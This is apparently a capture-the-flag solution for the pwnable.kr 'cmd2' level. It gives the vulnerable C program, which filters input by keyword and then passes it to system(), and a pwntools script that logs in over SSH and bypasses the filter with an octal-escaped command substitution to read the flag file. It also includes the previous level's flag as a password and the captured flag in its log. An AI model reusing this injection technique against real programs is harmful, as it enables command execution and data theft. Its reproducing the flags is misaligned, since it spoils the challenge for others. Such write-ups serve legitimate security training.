'''
Description:

    Daddy bought me a system command shell.
    but he put some filters to prevent me from playing with it without his permission...
    but I wanna play anytime I want!

    ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

Source of cmd2.c:

    #include <stdio.h>
    #include <string.h>

    int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
    }
        
    extern char** environ;
    void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
    }
    
    int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
    }

Solution

Solver:
'''

from pwn import *

user    = 'cmd2'
passwd  = 'mommy now I get what PATH environment is for :)'
host    = 'pwnable.kr'
port    = 2222
command = ''' ./cmd2 '$(echo "\\0057bin\\0057cat\\0040\\0057home\\0057cmd2\\0057fla*")' '''

s = ssh(user, host, port, passwd)
flag, status = s.run_to_end(command)
print '[+] Flag:', flag
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Flag: FuN_w1th_5h3ll_v4riabl3s_haha
$(echo "\0057bin\0057cat\0040\0057home\0057cmd2\0057fla*")

[*] Closed connection to 'pwnable.kr'
'''
